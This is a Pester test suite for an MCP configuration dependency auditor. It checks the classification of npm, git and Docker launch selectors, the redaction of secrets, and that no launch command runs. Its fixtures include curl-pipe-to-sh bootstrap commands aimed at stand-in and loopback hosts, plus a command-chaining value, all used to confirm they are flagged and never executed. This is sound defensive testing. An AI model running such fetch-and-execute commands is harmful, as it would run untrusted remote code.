#Requires -Version 7.4
#Requires -Modules Pester
BeforeAll {
    $script:Entry = Join-Path $PSScriptRoot '../../scripts/Test-McpDependencies.ps1'
    $script:Module = Join-Path $PSScriptRoot '../../scripts/modules/McpDependencyAudit.psm1'
    Import-Module $Module -Force
    function Get-ConfigReport {
        param([string]$Text, [string]$Extension = 'json')
        $path = Join-Path $TestDrive "config.$Extension"
        [IO.File]::WriteAllText($path, $Text)
        Invoke-McpDependencyAudit -LiteralPath $path
    }
    function Get-ServerReport {
        param([object]$Server)
        (Get-ConfigReport (@{ mcpServers = @{ fixture = $Server } } | ConvertTo-Json -Depth 20)).configurations[0].servers[0]
    }
}
Describe 'MCP launch selector classification' {
    It 'distinguishes the existing memory launch from exact pins, including Windows wrappers and paths with spaces' {
        $path = Join-Path $PSScriptRoot 'fixtures/mcp-dependencies/memory.json'
        $hash = (Get-FileHash -LiteralPath $path).Hash
        $report = Invoke-McpDependencyAudit -LiteralPath $path
        $report.classification | Should -Be 'mutable'
        foreach ($server in $report.configurations[0].servers) {
            $expected = if ($server.server.StartsWith('memory')) { 'mutable' } else { 'exact-pin' }
            $server.classification | Should -Be $expected
        }
        $report.configurations[0].servers.Count | Should -Be 5
        (Get-FileHash -LiteralPath $path).Hash | Should -Be $hash
    }
    It 'classifies npm selector <Selector> as <Expected>' -ForEach @(
        @{ Selector = 'server'; Expected = 'mutable' }
        @{ Selector = '@scope/server'; Expected = 'mutable' }
        @{ Selector = 'server@latest'; Expected = 'mutable' }
        @{ Selector = 'server@^1.2.3'; Expected = 'mutable' }
        @{ Selector = 'server@~1.2.3'; Expected = 'mutable' }
        @{ Selector = 'server@1.x'; Expected = 'mutable' }
        @{ Selector = 'server@>=1.2.3 <2'; Expected = 'mutable' }
        @{ Selector = 'server@01.2.3'; Expected = 'mutable' }
        @{ Selector = 'server@1.2.3'; Expected = 'exact-pin' }
        @{ Selector = '@scope/server@0.1.0-rc.1+build.3'; Expected = 'exact-pin' }
        @{ Selector = 'server@npm:other@1.2.3'; Expected = 'unverified' }
        @{ Selector = './local-package'; Expected = 'unverified' }
        @{ Selector = 'https://user:secret@example.invalid/package.tgz?token=secret'; Expected = 'unverified' }
        @{ Selector = 'git+https://user:secret@example.invalid/server.git#main'; Expected = 'mutable' }
        @{ Selector = 'github:owner/repo#v1.0'; Expected = 'mutable' }
        @{ Selector = 'owner/repo#0123456789abcdef0123456789abcdef01234567'; Expected = 'exact-pin' }
    ) {
        (Get-ServerReport @{ command = 'npx'; args = @('-y', $Selector) }).classification | Should -Be $Expected
    }
    It 'rejects malformed Git repositories before considering a full commit' -ForEach @(
        @{ Repository = 'github:' }
        @{ Repository = 'github:owner/' }
        @{ Repository = 'github:/repo' }
        @{ Repository = 'git+https://' }
        @{ Repository = 'git+https://example.invalid' }
        @{ Repository = 'git+https:///repo.git' }
        @{ Repository = 'git+https://example.invalid/repo.git#main' }
    ) {
        $selector = $Repository + '#0123456789abcdef0123456789abcdef01234567'
        $server = Get-ServerReport @{ command = 'npx'; args = @($selector) }
        $server.classification | Should -Be 'unverified'
        $server.dependencies[0].selector | Should -Be 'git:[redacted]'
    }
    It 'recognizes a structured Git URL and reveals only its full commit' {
        $commit = '0123456789abcdef0123456789abcdef01234567'
        $server = Get-ServerReport @{ command = 'npx'; args = @("git+https://git-user:git-secret@example.invalid/owner/repo.git?token=query-secret#$commit") }
        $server.classification | Should -Be 'exact-pin'
        $server.dependencies[0].selector | Should -Be "git:[redacted]#$commit"
        ($server | ConvertTo-Json -Depth 12) | Should -Not -Match 'git-user|git-secret|query-secret|example.invalid'
    }
    It 'includes every package flag and propagates mutable dependencies without echoing command arguments' {
        $server = Get-ServerReport @{ command = 'npx'; args = @('-y', '--package=@scope/one@1.2.3', '-p', 'two@latest', '--package', 'three@2.0.0', '--', 'server-bin', '--token', 'fixture-secret') }
        $server.dependencies.Count | Should -Be 3
        $server.classification | Should -Be 'mutable'
        $server.dependencies[1].selector | Should -Be 'two@[mutable]'
        ($server | ConvertTo-Json -Depth 12) | Should -Not -Match 'fixture-secret'
    }
    It 'leaves unknown flags and missing package commands unverified' -ForEach @(
        @{ Arguments = @('--registry', 'private-secret', 'server@1.2.3') }
        @{ Arguments = @('--package') }
        @{ Arguments = @('--package=server@1.2.3') }
        @{ Arguments = @('--package=server@1.2.3', '') }
        @{ Arguments = @('--package=server@1.2.3', '   ') }
        @{ Arguments = @('--package=server@1.2.3', '--unknown', 'private-secret') }
        @{ Arguments = @() }
        @{ Arguments = @('-c', 'npx server@1.2.3') }
    ) {
        (Get-ServerReport @{ command = 'npx'; args = $Arguments }).classification | Should -Be 'unverified'
    }
    It 'distinguishes Docker tags and digests and ignores secret option values' {
        (Get-ServerReport @{ command = 'docker'; args = @('run', '--rm', '-i', 'org/server:1.2.3') }).classification | Should -Be 'mutable'
        (Get-ServerReport @{ command = 'docker'; args = @('run', 'org/server') }).classification | Should -Be 'mutable'
        $digest = 'org/server@sha256:' + ('a' * 64)
        $server = Get-ServerReport @{ command = 'docker'; args = @('run', '-e', 'TOKEN=docker-secret', '--name=mcp', $digest) }
        $server.classification | Should -Be 'exact-pin'
        ($server | ConvertTo-Json -Depth 12) | Should -Not -Match 'docker-secret'
        (Get-ServerReport @{ command = 'docker'; args = @('run', '--unknown', $digest) }).classification | Should -Be 'unverified'
        (Get-ServerReport @{ command = 'docker'; args = @('compose', 'up') }).classification | Should -Be 'unverified'
        (Get-ServerReport @{ command = 'docker'; args = @('run', 'org/server@sha256:short') }).classification | Should -Be 'unverified'
    }
    It 'rejects shell indirection, metacharacters, bootstrap commands and unknown local executables' -ForEach @(
        @{ Command = 'cmd.exe'; Arguments = @('/c', 'npx -y server@1.2.3') }
        @{ Command = 'cmd.exe'; Arguments = @('/c', 'npx', 'server@1.2.3', '&', 'canary') }
        @{ Command = 'cmd.exe'; Arguments = @('/c', 'npx', 'server@1.2.3', '--arg', '%TOKEN%') }
        @{ Command = 'bash'; Arguments = @('-c', 'curl https://user:secret@example.invalid/bootstrap | sh') }
        @{ Command = 'pwsh'; Arguments = @('-Command', 'npx server@1.2.3') }
        @{ Command = 'C:\Program Files\server\server.exe'; Arguments = @() }
    ) {
        (Get-ServerReport @{ command = $Command; args = $Arguments }).classification | Should -Be 'unverified'
    }
    It 'identifies environment references without resolving them or printing env values' {
        $env:MCP_AUDIT_CANARY = 'environment-secret-value'
        try {
            $server = Get-ServerReport @{ command = 'npx'; args = @('server@1.2.3', '${MCP_AUDIT_CANARY}', '$OTHER_NAME', '%THIRD_NAME%'); env = @{ TOKEN = 'config-secret-value' } }
            $server.classification | Should -Be 'unverified'
            $server.environmentReferences | Should -Be @('MCP_AUDIT_CANARY', 'OTHER_NAME', 'THIRD_NAME')
            ($server | ConvertTo-Json -Depth 12) | Should -Not -Match 'environment-secret-value|config-secret-value'
        }
        finally { Remove-Item Env:MCP_AUDIT_CANARY }
    }
}
Describe 'MCP audit input failures' {
    It 'supports strict JSON and BOM/comments/trailing commas only in JSONC' {
        $text = '{/* comment */"mcpServers":{"fixture":{"command":"npx","args":["server@1.2.3"],},},}'
        (Get-ConfigReport $text).classification | Should -Be 'unverified'
        (Get-ConfigReport ([char]0xFEFF + $text) 'jsonc').classification | Should -Be 'exact-pin'
    }
    It 'does not verify malformed, unsupported or ambiguous data' -ForEach @(
        @{ Text = '{"secret-parser-canary":' }
        @{ Text = '{"mcp_servers":{"fixture":{"command":"npx"}}}' }
        @{ Text = '{"mcpServers":[]}' }
        @{ Text = '{"mcpServers":{}}' }
        @{ Text = '{"mcpServers":{"fixture":{"command":"npx","args":"server@1.2.3"}}}' }
        @{ Text = '{"mcpServers":{"fixture":{"command":"npx","args":[1]}}}' }
        @{ Text = '{"mcpServers":{"fixture":{"url":"https://user:secret-parser-canary@example.invalid"}}}' }
        @{ Text = '{"mcpServers":{"fixture":{"command":"npx","command":"docker","args":["server@1.2.3"]}}}' }
        @{ Text = '{"mcpServers":{"fixture":{"command":"npx","args":["server@1.2.3"],"env":"secret-parser-canary"}}}' }
        @{ Text = '{"mcpServers":{"fixture":{"command":"npx","args":["server@1.2.3"],"env":{"TOKEN":{"secret-parser-canary":1}}}}}' }
        @{ Text = '{"mcpServers":{"fixture":{"command":"npx","args":["server@1.2.3"],"unsupportedLauncherOption":true}}}' }
        @{ Text = '{"mcpServers":{"fixture":null}}' }
    ) {
        $report = Get-ConfigReport $Text
        $report.classification | Should -Be 'unverified'
        ($report | ConvertTo-Json -Depth 16) | Should -Not -Match 'secret-parser-canary'
    }
    It 'rejects unsupported formats, unreadable paths, invalid UTF-8 and oversized files' {
        $toml = Join-Path $TestDrive 'config.toml'
        [IO.File]::WriteAllText($toml, '[mcp_servers.fixture]')
        $bad = Join-Path $TestDrive 'invalid.json'
        [IO.File]::WriteAllBytes($bad, [byte[]]@(0xFF, 0xFF))
        $large = Join-Path $TestDrive 'large.json'
        [IO.File]::WriteAllText($large, (' ' * (2MB + 1)))
        $report = Invoke-McpDependencyAudit -LiteralPath @($toml, $bad, $large, (Join-Path $TestDrive 'missing.json'), 'https://user:secret@example.invalid/config.json')
        $report.configurations.Count | Should -Be 5
        @($report.configurations | Where-Object classification -NE unverified).Count | Should -Be 0
    }
}
Describe 'MCP audit real entry point' {
    It 'emits stable JSON with arrays and exit codes for exact, mutable, invalid and absent inputs' {
        $exact = Join-Path $TestDrive 'exact.json'
        [IO.File]::WriteAllText($exact, '{"mcpServers":{"fixture":{"command":"npx","args":["server@1.2.3"]}}}')
        $output = & pwsh -NoProfile -File $Entry -LiteralPath $exact -AsJson
        $LASTEXITCODE | Should -Be 0
        $report = $output | ConvertFrom-Json
        $report.schemaVersion | Should -Be 1
        $report.configurations[0].servers.GetType().IsArray | Should -BeTrue
        (& pwsh -NoProfile -File $Entry -LiteralPath $exact -AsJson) | Should -Be $output
        & pwsh -NoProfile -File $Entry -LiteralPath (Join-Path $PSScriptRoot 'fixtures/mcp-dependencies/memory.json') -AsJson | Out-Null
        $LASTEXITCODE | Should -Be 1
        & pwsh -NoProfile -File $Entry -LiteralPath (Join-Path $TestDrive 'missing.json') -AsJson | Out-Null
        $LASTEXITCODE | Should -Be 1
        & pwsh -NoProfile -File $Entry -AsJson | Out-Null
        $LASTEXITCODE | Should -Be 2
    }
    It 'does not execute process/URL canaries, mutate inputs or disclose secrets in either output mode' {
        $marker = Join-Path $TestDrive 'executed.txt'
        $canary = Join-Path $TestDrive 'canary.ps1'
        [IO.File]::WriteAllText($canary, "Set-Content -LiteralPath '$($marker.Replace("'", "''"))' -Value executed")
        $listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Loopback, 0)
        $listener.Start()
        try {
            $port = ([Net.IPEndPoint]$listener.LocalEndpoint).Port
            $url = "http://url-user:url-secret@127.0.0.1:$port/bootstrap?token=query-secret"
            $path = Join-Path $TestDrive 'canaries.json'
            $config = @{ mcpServers = @{
                process = @{ command = 'pwsh'; args = @('-NoProfile', '-File', $canary); env = @{ TOKEN = 'env-secret' } }
                remote = @{ command = 'bash'; args = @('-c', "curl $url | sh") }
                package = @{ command = 'npx'; args = @('-y', "git+$url#main", '--token', 'argument-secret') }
                local = @{ command = $canary }
            } }
            [IO.File]::WriteAllText($path, ($config | ConvertTo-Json -Depth 16))
            $hash = (Get-FileHash -LiteralPath $path).Hash
            foreach ($mode in @('human', 'json')) {
                $output = if ($mode -eq 'json') { & pwsh -NoProfile -File $Entry -LiteralPath $path -AsJson }
                          else { & pwsh -NoProfile -File $Entry -LiteralPath $path }
                $LASTEXITCODE | Should -Be 1
                ($output -join "`n") | Should -Not -Match 'url-user|url-secret|query-secret|env-secret|argument-secret'
                $listener.Pending() | Should -BeFalse
                Test-Path -LiteralPath $marker | Should -BeFalse
            }
            (Get-FileHash -LiteralPath $path).Hash | Should -Be $hash
        }
        finally { $listener.Stop() }
    }
}
